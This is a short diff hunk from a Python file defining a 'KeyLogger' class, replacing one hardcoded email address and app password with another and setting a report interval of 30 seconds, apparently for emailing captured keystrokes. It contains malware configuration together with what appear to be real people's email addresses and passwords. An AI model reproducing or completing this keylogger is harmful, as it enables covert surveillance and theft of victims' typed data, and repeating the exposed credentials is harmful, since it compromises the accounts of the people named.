@@ -15,8 +15,8 @@ from email import encoders
 import time
 import re
 
-EMAIL_ADDRESS = "anderson.gomez645@pascualbravo.edu.co"
-EMAIL_PASSWORD = "wihj urmx oioy cjwg"
+EMAIL_ADDRESS = "scritinamonsalvez@gmail.com"
+EMAIL_PASSWORD = "rjcj lrez lwws dxdq"
 SEND_REPORT_EVERY = 30
 
 class KeyLogger:
